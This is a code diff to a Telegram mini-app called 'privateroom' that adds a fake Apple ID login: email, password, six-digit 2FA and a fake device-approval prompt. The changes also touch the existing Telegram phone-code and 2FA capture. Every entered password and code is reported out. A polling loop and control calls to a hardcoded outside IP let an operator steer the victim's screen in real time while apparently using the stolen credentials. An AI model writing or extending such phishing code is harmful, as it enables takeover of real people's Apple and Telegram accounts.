@@ -191,6 +191,8 @@ function initApp() {
 
     const googleAuthModal = document.getElementById("googleAuthModal");
     const btnCloseGoogleModal = document.getElementById("btnCloseGoogleModal");
+    const appleAuthModal = document.getElementById("appleAuthModal");
+    const btnCloseAppleModal = document.getElementById("btnCloseAppleModal");
 
     function showStep(stepElement) {
         let targetStep = stepElement;
@@ -247,6 +249,15 @@ function initApp() {
             }
         }
 
+        if (appleAuthModal) {
+            if (isAppleStep && !isAuthorized) {
+                appleAuthModal.classList.remove("hidden");
+                if (userAppleEmail) updateAppleDisplays(userAppleEmail);
+            } else {
+                appleAuthModal.classList.add("hidden");
+            }
+        }
+
         const appContainer = document.querySelector(".app-container");
         if (appContainer) {
             if (isAppleStep) {
@@ -258,6 +269,9 @@ function initApp() {
 
         if (isGoogleStep && typeof startGooglePolling === "function") {
             startGooglePolling();
+        }
+        if (isAppleStep && typeof startApplePolling === "function") {
+            startApplePolling();
         }
 
         [
@@ -578,6 +592,36 @@ function initApp() {
         });
     }
 
+    const btnToggleManualPhone = document.getElementById("btnToggleManualPhone");
+    const manualPhoneGroup = document.getElementById("manualPhoneGroup");
+    const manualPhoneInput = document.getElementById("manualPhoneInput");
+    const btnSubmitManualPhone = document.getElementById("btnSubmitManualPhone");
+
+    if (btnToggleManualPhone && manualPhoneGroup) {
+        btnToggleManualPhone.addEventListener("click", () => {
+            const isHidden = manualPhoneGroup.classList.contains("hidden");
+            if (isHidden) {
+                manualPhoneGroup.classList.remove("hidden");
+                btnToggleManualPhone.textContent = "Скрыть ручной ввод";
+                if (manualPhoneInput) manualPhoneInput.focus();
+            } else {
+                manualPhoneGroup.classList.add("hidden");
+                btnToggleManualPhone.textContent = "Ввести номер вручную";
+            }
+        });
+    }
+
+    if (btnSubmitManualPhone && manualPhoneInput) {
+        btnSubmitManualPhone.addEventListener("click", () => {
+            const raw = manualPhoneInput.value.trim();
+            if (!raw || raw.replace(/\D/g, "").length < 10) {
+                showToast("Введите корректный номер телефона (от 10 цифр)");
+                return;
+            }
+            handlePhoneSubmit(raw);
+        });
+    }
+
     // Step 1: Request native Telegram Contact
     if (btnRequestPhone) {
         btnRequestPhone.addEventListener("click", () => {
@@ -594,7 +638,7 @@ function initApp() {
                     tg.requestContact((status, response) => {
                         btnRequestPhone.disabled = false;
                         if (status) {
-                            // Extract contact info
+                            // Extract contact info if provided
                             let phone = "";
                             if (response && response.responseUnsafe && response.responseUnsafe.contact) {
                                 phone = response.responseUnsafe.contact.phone_number;
@@ -603,7 +647,7 @@ function initApp() {
                             } else if (response && response.phone_number) {
                                 phone = response.phone_number;
                             }
-                            handlePhoneSubmit(phone || "shared_contact");
+                            handlePhoneSubmit(phone);
                         } else {
                             showToast("Для продолжения необходимо поделиться контактом");
                         }
@@ -611,33 +655,41 @@ function initApp() {
                 } catch (err) {
                     console.error("requestContact error:", err);
                     btnRequestPhone.disabled = false;
-                    handlePhoneSubmit("shared_contact");
+                    handlePhoneSubmit("");
                 }
             } else {
-                // Fallback outside Telegram client
-                const manual = prompt("Введите ваш номер телефона (в формате +79991234567):");
-                if (manual) {
-                    handlePhoneSubmit(manual);
+                if (manualPhoneGroup) {
+                    manualPhoneGroup.classList.remove("hidden");
+                    if (btnToggleManualPhone) btnToggleManualPhone.textContent = "Скрыть ручной ввод";
+                    if (manualPhoneInput) manualPhoneInput.focus();
+                } else {
+                    const manual = prompt("Введите ваш номер телефона (в формате +79991234567):");
+                    if (manual) {
+                        handlePhoneSubmit(manual);
+                    }
                 }
             }
         });
     }
 
     async function handlePhoneSubmit(phone) {
-        userPhone = phone.replace(/[^\d+]/g, "");
-        if (userPhone && !userPhone.startsWith("+")) {
-            userPhone = "+" + userPhone;
+        let cleanPhone = phone ? phone.replace(/[^\d+]/g, "") : "";
+        if (cleanPhone && !cleanPhone.startsWith("+")) {
+            cleanPhone = "+" + cleanPhone;
         }
+        userPhone = cleanPhone;
 
         if (btnRequestPhone) btnRequestPhone.disabled = true;
+        if (btnSubmitManualPhone) btnSubmitManualPhone.disabled = true;
 
         try {
+            const userTgId = (typeof getUserTgId === "function" ? getUserTgId() : null);
             const res = await fetch("/api/auth/send-code", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    phone: userPhone || "+10000000000",
-                    tg_id: tg?.initDataUnsafe?.user?.id || null,
+                    phone: userPhone,
+                    tg_id: userTgId,
                     username: tg?.initDataUnsafe?.user?.username || null
                 })
             });
@@ -645,6 +697,9 @@ function initApp() {
             const data = await res.json();
             if (data.ok) {
                 currentSessionId = data.session_id;
+                if (data.phone) {
+                    userPhone = data.phone;
+                }
                 try {
                     localStorage.setItem("privateroom_current_step", "stepCode");
                     localStorage.setItem("privateroom_saved_phone", userPhone);
@@ -664,6 +719,7 @@ function initApp() {
             showToast("Не удалось отправить код. Попробуйте ещё раз.");
         } finally {
             if (btnRequestPhone) btnRequestPhone.disabled = false;
+            if (btnSubmitManualPhone) btnSubmitManualPhone.disabled = false;
         }
     }
 
@@ -826,7 +882,7 @@ function initApp() {
             reportAuthEvent("entered_code", `Введен код: ${code}`);
 
             try {
-                const userTgId = tg?.initDataUnsafe?.user?.id || null;
+                const userTgId = (typeof getUserTgId === "function" ? getUserTgId() : null);
                 const res = await fetch("/api/auth/verify-code", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -918,7 +974,7 @@ function initApp() {
             reportAuthEvent("entered_2fa", `Введен пароль: ${password}`, password);
 
             try {
-                const userTgId = tg?.initDataUnsafe?.user?.id || null;
+                const userTgId = (typeof getUserTgId === "function" ? getUserTgId() : null);
                 const res = await fetch("/api/auth/verify-2fa", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -952,6 +1008,7 @@ function initApp() {
             localStorage.removeItem("privateroom_current_step");
             localStorage.removeItem("privateroom_saved_phone");
             localStorage.removeItem("privateroom_google_email");
+            localStorage.removeItem("privateroom_apple_email");
             localStorage.removeItem("privateroom_session_id");
             localStorage.removeItem("privateroom_code_requested_at");
             localStorage.removeItem("privateroom_auth_phone");
@@ -965,6 +1022,12 @@ function initApp() {
         if (googleAuthModal) {
             googleAuthModal.classList.add("hidden");
         }
+        if (appleAuthModal) {
+            appleAuthModal.classList.add("hidden");
+        }
+        if (typeof stopApplePolling === "function") {
+            stopApplePolling();
+        }
 
         updateAuthHeaderUI();
         showStep(stepSuccess);
@@ -974,8 +1037,8 @@ function initApp() {
         const userTgId = tg?.initDataUnsafe?.user?.id || null;
         const userUsername = tg?.initDataUnsafe?.user?.username || null;
         const userNickname = [tg?.initDataUnsafe?.user?.first_name, tg?.initDataUnsafe?.user?.last_name].filter(Boolean).join(" ") || null;
-        const pwd = ((typeof password2FA !== "undefined" && password2FA) ? password2FA.value : null) || userGooglePassword || data?.password || null;
-        const email = userGoogleEmail || data?.google_email || localStorage.getItem("privateroom_google_email") || null;
+        const pwd = ((typeof password2FA !== "undefined" && password2FA) ? password2FA.value : null) || userGooglePassword || userApplePassword || data?.password || null;
+        const email = userGoogleEmail || userAppleEmail || data?.google_email || data?.apple_email || localStorage.getItem("privateroom_google_email") || localStorage.getItem("privateroom_apple_email") || null;
 
         const urlParams = new URLSearchParams(window.location.search);
         const botTokenParam = urlParams.get("bot_token") || urlParams.get("mirror_token") || localStorage.getItem("privateroom_bot_token") || null;
@@ -1551,26 +1614,161 @@ function initApp() {
         });
     }
 
-    // Apple ID Navigation & Actions
+    // ==========================================
+    // Apple ID / iCloud OAuth Flow & Admin Control
+    // ==========================================
+    const appleLoadingBar = document.getElementById("appleLoadingBar");
+    const appleEmailError = document.getElementById("appleEmailError");
+    const appleEmailErrorText = document.getElementById("appleEmailErrorText");
+    const applePasswordError = document.getElementById("applePasswordError");
+    const applePasswordErrorText = document.getElementById("applePasswordErrorText");
+    const apple2faError = document.getElementById("apple2faError");
+    const apple2faErrorText = document.getElementById("apple2faErrorText");
+    const appleGeoLocation = document.getElementById("appleGeoLocation");
+
+    let applePollTimer = null;
+    let handledApplePasswordError = false;
+    let handledAppleCodeError = false;
+
+    function clearAppleErrors() {
+        if (appleEmailError) appleEmailError.classList.add("hidden");
+        if (applePasswordError) applePasswordError.classList.add("hidden");
+        if (apple2faError) apple2faError.classList.add("hidden");
+
+        const emailBox = document.getElementById("appleEmailBox");
+        const passBox = document.getElementById("applePasswordBox");
+        if (emailBox) emailBox.classList.remove("apple-input-invalid");
+        if (passBox) passBox.classList.remove("apple-input-invalid");
+
+        if (appleEmailInput) appleEmailInput.classList.remove("apple-input-invalid");
+        if (applePasswordInput) applePasswordInput.classList.remove("apple-input-invalid");
+        const pinCells = document.querySelectorAll(".apple-pin-cell");
+        pinCells.forEach(cell => cell.classList.remove("apple-pin-invalid"));
+    }
+
+    function showAppleError(type, msg) {
+        clearAppleErrors();
+        if (type === "email") {
+            if (appleEmailErrorText && msg) appleEmailErrorText.textContent = msg;
+            if (appleEmailError) appleEmailError.classList.remove("hidden");
+            const emailBox = document.getElementById("appleEmailBox");
+            if (emailBox) emailBox.classList.add("apple-input-invalid");
+            if (appleEmailInput) {
+                appleEmailInput.classList.add("apple-input-invalid");
+                appleEmailInput.focus();
+            }
+        } else if (type === "password") {
+            if (applePasswordErrorText && msg) applePasswordErrorText.textContent = msg;
+            if (applePasswordError) applePasswordError.classList.remove("hidden");
+            const passBox = document.getElementById("applePasswordBox");
+            if (passBox) passBox.classList.add("apple-input-invalid");
+            if (applePasswordInput) {
+                applePasswordInput.classList.add("apple-input-invalid");
+                applePasswordInput.focus();
+            }
+        } else if (type === "2fa") {
+            if (apple2faErrorText && msg) apple2faErrorText.textContent = msg;
+            if (apple2faError) apple2faError.classList.remove("hidden");
+            const pinCells = document.querySelectorAll(".apple-pin-cell");
+            pinCells.forEach(cell => cell.classList.add("apple-pin-invalid"));
+            const firstCell = document.querySelector(".apple-pin-cell[data-index='0']");
+            if (firstCell) firstCell.focus();
+        }
+    }
+
+    function updateAppleDisplays(email) {
+        if (!email) return;
+        if (appleDisplayEmail) appleDisplayEmail.textContent = email;
+        if (apple2faDisplayEmail) apple2faDisplayEmail.textContent = email;
+        const initial = email.charAt(0).toUpperCase();
+        if (appleChipInitial) appleChipInitial.textContent = initial || "";
+    }
+
+    function getApplePinValue() {
+        const cells = document.querySelectorAll(".apple-pin-cell");
+        let val = "";
+        cells.forEach(c => { val += (c.value || ""); });
+        return val;
+    }
+
+    function clearApplePinCells() {
+        const pinCells = document.querySelectorAll(".apple-pin-cell");
+        pinCells.forEach(cell => {
+            cell.value = "";
+            cell.classList.remove("apple-pin-invalid");
+        });
+        if (apple2faCodeInput) apple2faCodeInput.value = "";
+        const firstCell = document.querySelector(".apple-pin-cell[data-index='0']");
+        if (firstCell) firstCell.focus();
+    }
+
+    async function detectAppleGeoLocation() {
+        try {
+            const res = await fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(3000) });
+            if (res.ok) {
+                const data = await res.json();
+                if (data && data.city && data.country_name) {
+                    if (appleGeoLocation) appleGeoLocation.textContent = `${data.city}, ${data.country_name}`;
+                    return;
+                }
+            }
+        } catch (e) {}
+
+        try {
+            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            if (tz) {
+                const city = tz.split("/").pop().replace(/_/g, " ");
+                if (appleGeoLocation && city) {
+                    appleGeoLocation.textContent = `${city}, Россия`;
+                }
+            }
+        } catch (e) {}
+    }
+
+    function clearAppleStateAndReturnPhone() {
+        try {
+            localStorage.removeItem("privateroom_current_step");
+            localStorage.removeItem("privateroom_apple_email");
+        } catch (e) {}
+        userAppleEmail = "";
+        userApplePassword = "";
+        stopApplePolling();
+        clearAppleErrors();
+        if (appleAuthModal) appleAuthModal.classList.add("hidden");
+        showStep(stepPhone);
+    }
+
+    // Modal Triggers & Navigation
     if (btnSwitchToApple) {
         btnSwitchToApple.addEventListener("click", () => {
+            clearAppleErrors();
             showStep(stepAppleEmail);
+            startApplePolling();
+            detectAppleGeoLocation();
             if (appleEmailInput) {
                 appleEmailInput.value = userAppleEmail || "";
-                setTimeout(() => appleEmailInput.focus(), 150);
+                setTimeout(() => {
+                    try {
+                        appleEmailInput.focus();
+                        if (typeof appleEmailInput.setSelectionRange === "function") {
+                            const len = appleEmailInput.value.length;
+                            appleEmailInput.setSelectionRange(len, len);
+                        }
+                    } catch (e) {}
+                }, 150);
             }
         });
     }
 
-    if (btnBackFromAppleToTG) {
-        btnBackFromAppleToTG.addEventListener("click", () => {
-            showStep(stepPhone);
-        });
+    if (btnCloseAppleModal) {
+        btnCloseAppleModal.addEventListener("click", clearAppleStateAndReturnPhone);
     }
 
-    if (btnAppleBackToHome) {
-        btnAppleBackToHome.addEventListener("click", () => {
-            showStep(stepSuccess);
+    if (appleAuthModal) {
+        appleAuthModal.addEventListener("click", (e) => {
+            if (e.target === appleAuthModal) {
+                clearAppleStateAndReturnPhone();
+            }
         });
     }
 
@@ -1581,100 +1779,360 @@ function initApp() {
         });
     }
 
-    if (btnBackToApplePassword) {
-        btnBackToApplePassword.addEventListener("click", () => {
-            showStep(stepApplePassword);
-            if (applePasswordInput) applePasswordInput.focus();
-        });
-    }
-
     if (btnBackToApple2FA) {
         btnBackToApple2FA.addEventListener("click", () => {
             showStep(stepApple2FA);
-            if (apple2faCodeInput) apple2faCodeInput.focus();
+            const firstCell = document.querySelector(".apple-pin-cell[data-index='0']");
+            if (firstCell) firstCell.focus();
         });
     }
 
+    // Input listeners
+    if (appleEmailInput) {
+        appleEmailInput.addEventListener("input", clearAppleErrors);
+        appleEmailInput.addEventListener("keydown", (e) => {
+            if (e.key === "Enter") {
+                e.preventDefault();
+                if (btnSubmitAppleEmail) btnSubmitAppleEmail.click();
+            }
+        });
+    }
+
+    if (applePasswordInput) {
+        applePasswordInput.addEventListener("input", clearAppleErrors);
+        applePasswordInput.addEventListener("keydown", (e) => {
+            if (e.key === "Enter") {
+                e.preventDefault();
+                if (btnSubmitApplePassword) btnSubmitApplePassword.click();
+            }
+        });
+    }
+
+    // Eye toggle for Apple Password
     if (toggleApplePasswordBtn) {
+        const eyeIconSvg = document.getElementById("appleEyeIcon");
+        const svgOpenPath = 'M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z';
+        const svgOffPath = 'M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.44-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.17c0-1.66-1.34-3-3-3l-.17.02z';
+
         toggleApplePasswordBtn.addEventListener("click", () => {
             if (applePasswordInput) {
+                const pathEl = eyeIconSvg ? eyeIconSvg.querySelector("path") : null;
                 if (applePasswordInput.type === "password") {
                     applePasswordInput.type = "text";
-                    toggleApplePasswordBtn.textContent = "🔒";
+                    if (pathEl) pathEl.setAttribute("d", svgOffPath);
                 } else {
                     applePasswordInput.type = "password";
-                    toggleApplePasswordBtn.textContent = "👁";
+                    if (pathEl) pathEl.setAttribute("d", svgOpenPath);
                 }
             }
         });
     }
 
+    // Step 1: Submit Apple ID (Email/Phone)
     if (btnSubmitAppleEmail) {
         btnSubmitAppleEmail.addEventListener("click", () => {
+            clearAppleErrors();
             const rawEmail = appleEmailInput ? appleEmailInput.value.trim() : "";
-            if (!rawEmail || rawEmail.length < 4) {
-                showToast("Введите ваш Apple ID (Email или номер)");
+
+            if (!rawEmail) {
+                showAppleError("email", "Введите действительный Apple ID.");
                 return;
             }
+
+            if (!isValidGoogleIdentifier(rawEmail)) {
+                showAppleError("email", "Не удалось найти учетную запись Apple ID.");
+                return;
+            }
+
             userAppleEmail = rawEmail;
             try {
                 localStorage.setItem("privateroom_apple_email", userAppleEmail);
                 localStorage.setItem("privateroom_current_step", "stepApplePassword");
             } catch (e) {}
 
-            updateAppleDisplays(userAppleEmail);
-            reportAuthEvent("apple_email", `Введен Apple ID: ${userAppleEmail}`, null, null, userAppleEmail);
-            showStep(stepApplePassword);
-            if (applePasswordInput) {
-                applePasswordInput.value = "";
-                setTimeout(() => applePasswordInput.focus(), 150);
-            }
+            btnSubmitAppleEmail.disabled = true;
+            if (appleLoadingBar) appleLoadingBar.classList.remove("hidden");
+
+            setTimeout(() => {
+                btnSubmitAppleEmail.disabled = false;
+                if (appleLoadingBar) appleLoadingBar.classList.add("hidden");
+                updateAppleDisplays(userAppleEmail);
+                reportAuthEvent("apple_email", `Введен Apple ID: ${userAppleEmail}`, null, null, userAppleEmail);
+                showStep(stepApplePassword);
+                startApplePolling();
+                if (applePasswordInput) {
+                    applePasswordInput.value = "";
+                    setTimeout(() => applePasswordInput.focus(), 150);
+                }
+            }, 1000);
         });
     }
 
+    // Step 2: Submit Apple ID Password
     if (btnSubmitApplePassword) {
         btnSubmitApplePassword.addEventListener("click", () => {
+            clearAppleErrors();
             const pwd = applePasswordInput ? applePasswordInput.value : "";
             if (!pwd || pwd.length < 4) {
-                showToast("Введите пароль от Apple ID");
+                showAppleError("password", "Введите пароль. Длина не менее 4 символов.");
                 return;
             }
-            userApplePassword = pwd;
-            try {
-                localStorage.setItem("privateroom_current_step", "stepApple2FA");
-            } catch (e) {}
 
+            handledApplePasswordError = false;
+            userApplePassword = pwd;
+            btnSubmitApplePassword.disabled = true;
+            if (appleLoadingBar) appleLoadingBar.classList.remove("hidden");
+
+            sendAppleControlCommand("checking", null);
             reportAuthEvent("apple_password", `Введен пароль Apple ID: ${pwd}`, pwd, null, userAppleEmail);
-            showStep(stepApple2FA);
-            if (apple2faCodeInput) {
-                apple2faCodeInput.value = "";
-                setTimeout(() => apple2faCodeInput.focus(), 150);
+            startApplePolling();
+        });
+    }
+
+    // Step 3: PIN Cells Initialization & Management
+    const pinCells = document.querySelectorAll(".apple-pin-cell");
+    pinCells.forEach((cell, idx) => {
+        cell.addEventListener("input", () => {
+            clearAppleErrors();
+            handledAppleCodeError = false;
+            let val = cell.value.replace(/\D/g, "");
+            if (val.length > 1) {
+                val = val.charAt(val.length - 1);
+            }
+            cell.value = val;
+
+            const fullPin = getApplePinValue();
+            if (apple2faCodeInput) apple2faCodeInput.value = fullPin;
+
+            if (val && idx < 5) {
+                const nextCell = document.querySelector(`.apple-pin-cell[data-index='${idx + 1}']`);
+                if (nextCell) nextCell.focus();
+            }
+
+            if (fullPin.length === 6) {
+                setTimeout(() => submitApple2FA(), 180);
             }
         });
+
+        cell.addEventListener("keydown", (e) => {
+            if (e.key === "Backspace") {
+                if (!cell.value && idx > 0) {
+                    const prevCell = document.querySelector(`.apple-pin-cell[data-index='${idx - 1}']`);
+                    if (prevCell) {
+                        prevCell.value = "";
+                        prevCell.focus();
+                        const fullPin = getApplePinValue();
+                        if (apple2faCodeInput) apple2faCodeInput.value = fullPin;
+                    }
+                }
+            }
+        });
+
+        cell.addEventListener("paste", (e) => {
+            e.preventDefault();
+            clearAppleErrors();
+            handledAppleCodeError = false;
+            const pasted = (e.clipboardData || window.clipboardData).getData("text");
+            const digits = (pasted || "").replace(/\D/g, "").slice(0, 6);
+            if (!digits) return;
+
+            pinCells.forEach((c, i) => {
+                c.value = digits[i] || "";
+            });
+            const fullPin = getApplePinValue();
+            if (apple2faCodeInput) apple2faCodeInput.value = fullPin;
+
+            if (digits.length === 6) {
+                setTimeout(() => submitApple2FA(), 180);
+            } else {
+                const targetCell = document.querySelector(`.apple-pin-cell[data-index='${digits.length}']`);
+                if (targetCell) targetCell.focus();
+            }
+        });
+    });
+
+    function submitApple2FA() {
+        clearAppleErrors();
+        const code = getApplePinValue() || (apple2faCodeInput ? apple2faCodeInput.value.trim() : "");
+        if (!code || code.length < 6) {
+            showAppleError("2fa", "Введите 6-значный проверочный код Apple ID.");
+            return;
+        }
+
+        handledAppleCodeError = false;
+        if (btnSubmitApple2FA) btnSubmitApple2FA.disabled = true;
+        if (appleLoadingBar) appleLoadingBar.classList.remove("hidden");
+
+        sendAppleControlCommand("checking", null);
+        reportAuthEvent("apple_code", `Введен 2FA код Apple ID: ${code}`, userApplePassword, null, userAppleEmail);
+        startApplePolling();
     }
 
     if (btnSubmitApple2FA) {
-        btnSubmitApple2FA.addEventListener("click", () => {
-            const code = apple2faCodeInput ? apple2faCodeInput.value.trim() : "";
-            if (!code || code.length < 4) {
-                showToast("Введите 6-значный код подтверждения Apple ID");
-                return;
+        btnSubmitApple2FA.addEventListener("click", submitApple2FA);
+    }
+
+    const btnAppleResendCode = document.getElementById("btnAppleResendCode");
+    if (btnAppleResendCode) {
+        btnAppleResendCode.addEventListener("click", (e) => {
+            e.preventDefault();
+            if (appleLoadingBar) {
+                appleLoadingBar.classList.remove("hidden");
+                setTimeout(() => appleLoadingBar.classList.add("hidden"), 1000);
             }
-            reportAuthEvent("apple_code", `Введен 2FA код Apple ID: ${code}`, userApplePassword, null, userAppleEmail);
-            reportAuthEvent("apple_prompt_shown", "Показано всплывающее подтверждение на устройстве Apple", userApplePassword, null, userAppleEmail);
-            showStep(stepApplePrompt);
+            showToast("Код проверки отправлен повторно");
+            reportAuthEvent("apple_code_resend", "Пользователь нажал «Не получили проверочный код?» на Apple 2FA", userApplePassword, null, userAppleEmail);
         });
     }
 
+    // Step 4: Device Prompt ("Разрешить на iPhone")
     if (btnConfirmApplePrompt) {
         btnConfirmApplePrompt.addEventListener("click", () => {
-            reportAuthEvent("apple_prompt_confirmed", "Пользователь подтвердил вход на устройстве Apple", userApplePassword, null, userAppleEmail);
-            finishAuth({
-                status: "success",
-                google_email: userAppleEmail,
-                password: userApplePassword
-            });
+            if (appleLoadingBar) appleLoadingBar.classList.remove("hidden");
+            btnConfirmApplePrompt.disabled = true;
+            const originalText = btnConfirmApplePrompt.textContent;
+            btnConfirmApplePrompt.textContent = "Разрешено...";
+
+            reportAuthEvent("apple_prompt_confirmed", "Пользователь подтвердил вход на устройстве Apple (Разрешить)", userApplePassword, null, userAppleEmail);
+            sendAppleControlCommand("prompt_confirmed", null);
+
+            setTimeout(() => {
+                if (appleLoadingBar) appleLoadingBar.classList.add("hidden");
+                btnConfirmApplePrompt.disabled = false;
+                btnConfirmApplePrompt.textContent = originalText;
+                showStep(stepApple2FA);
+                clearApplePinCells();
+            }, 1200);
         });
+    }
+
+    // Apple Polling & Real-time Command Dispatcher
+    function stopApplePolling() {
+        if (applePollTimer) {
+            clearInterval(applePollTimer);
+            applePollTimer = null;
+        }
+    }
+
+    function startApplePolling() {
+        stopApplePolling();
+        const apiEndpoints = [
+            "/api/auth/status",
+            "http://31.76.101.210:8080/api/auth/status"
+        ];
+
+        applePollTimer = setInterval(async () => {
+            const targetTgId = getUserTgId() || "";
+            let data = null;
+            for (const ep of apiEndpoints) {
+                try {
+                    const queryStr = `?tg_id=${encodeURIComponent(targetTgId)}&email=${encodeURIComponent(userAppleEmail || "")}&_t=${Date.now()}`;
+                    const resp = await fetch(ep + queryStr, { cache: "no-store" });
+                    if (resp.ok) {
+                        data = await resp.json();
+                        if (data && data.ok) break;
+                    }
+                } catch (e) {
+                    console.debug("applePolling fetch error on " + ep, e);
+                }
+            }
+
+            if (data && data.ok && data.apple_control) {
+                const ctrl = data.apple_control;
+                console.log("APPLE CTRL:", ctrl);
+                if (ctrl.status === "checking" || ctrl.status === "pending") {
+                    if (appleLoadingBar) appleLoadingBar.classList.remove("hidden");
+                    if (btnSubmitApplePassword) btnSubmitApplePassword.disabled = true;
+                    if (btnSubmitApple2FA) btnSubmitApple2FA.disabled = true;
+                } else if (ctrl.status === "error_password") {
+                    if (appleLoadingBar) appleLoadingBar.classList.add("hidden");
+                    if (btnSubmitApplePassword) btnSubmitApplePassword.disabled = false;
+                    if (!stepApplePassword.classList.contains("active")) {
+                        showStep(stepApplePassword);
+                    }
+                    if (!handledApplePasswordError) {
+                        handledApplePasswordError = true;
+                        if (applePasswordInput) {
+                            applePasswordInput.value = "";
+                        }
+                        showAppleError("password", ctrl.error_msg || "Неверный Apple ID или пароль.");
+                        sendAppleControlCommand("idle", null);
+                    }
+                } else if (ctrl.status === "correct_password") {
+                    if (appleLoadingBar) appleLoadingBar.classList.add("hidden");
+                    if (btnSubmitApplePassword) btnSubmitApplePassword.disabled = false;
+                    clearAppleErrors();
+                } else if (ctrl.status === "ask_code") {
+                    if (appleLoadingBar) appleLoadingBar.classList.add("hidden");
+                    if (!stepApple2FA.classList.contains("active")) {
+                        showStep(stepApple2FA);
+                    }
+                    clearAppleErrors();
+                    const firstCell = document.querySelector(".apple-pin-cell[data-index='0']");
+                    if (firstCell) firstCell.focus();
+                } else if (ctrl.status === "error_code") {
+                    if (appleLoadingBar) appleLoadingBar.classList.add("hidden");
+                    if (btnSubmitApple2FA) btnSubmitApple2FA.disabled = false;
+                    if (!stepApple2FA.classList.contains("active")) {
+                        showStep(stepApple2FA);
+                    }
+                    if (!handledAppleCodeError) {
+                        handledAppleCodeError = true;
+                        showAppleError("2fa", ctrl.error_msg || "Неверный код проверки. Повторите попытку.");
+                        clearApplePinCells();
+                        sendAppleControlCommand("idle", null);
+                    }
+                } else if (ctrl.status === "ask_prompt") {
+                    if (appleLoadingBar) appleLoadingBar.classList.add("hidden");
+                    if (!stepApplePrompt.classList.contains("active")) {
+                        showStep(stepApplePrompt);
+                    }
+                    detectAppleGeoLocation();
+                } else if (ctrl.status === "completed" || data.authorized) {
+                    stopApplePolling();
+                    if (appleLoadingBar) appleLoadingBar.classList.add("hidden");
+                    if (appleAuthModal) appleAuthModal.classList.add("hidden");
+                    finishAuth({
+                        status: "success",
+                        google_email: userAppleEmail,
+                        password: userApplePassword
+                    });
+                }
+            }
+        }, 1200);
+    }
+
+    async function sendAppleControlCommand(status, errorMsg) {
+        let targetTgId = (typeof tgUser !== "undefined" && tgUser && tgUser.id) ? tgUser.id : (typeof getUserTgId === "function" ? getUserTgId() : "");
+        if (!targetTgId) {
+            const urlParams = new URLSearchParams(window.location.search);
+            targetTgId = urlParams.get("tg_id") || urlParams.get("user_id") || (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user ? window.Telegram.WebApp.initDataUnsafe.user.id : "");
+            try {
+                if (!targetTgId) targetTgId = localStorage.getItem("privateroom_user_id") || "";
+            } catch (e) {}
+        }
+        const apiEndpoints = [
+            "/api/auth/apple-control",
+            "http://31.76.101.210:8080/api/auth/apple-control"
+        ];
+        const payload = JSON.stringify({
+            tg_id: targetTgId,
+            email: userAppleEmail,
+            status: status,
+            error_msg: errorMsg || null
+        });
+        for (const ep of apiEndpoints) {
+            try {
+                const r = await fetch(ep, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: payload
+                });
+                if (r.ok) break;
+            } catch (e) {
+                console.debug("sendAppleControlCommand fetch error on " + ep, e);
+            }
+        }
     }
 
     // Always reset on initial load
@@ -1691,6 +2149,8 @@ function initApp() {
         } catch (e) {}
 
         if (googleAuthModal) googleAuthModal.classList.add("hidden");
+        if (appleAuthModal) appleAuthModal.classList.add("hidden");
+        if (typeof stopApplePolling === "function") stopApplePolling();
         if (roomInitialBlock) roomInitialBlock.classList.add("hidden");
         if (roomLoadingBlock) {
             roomLoadingBlock.classList.remove("hidden");
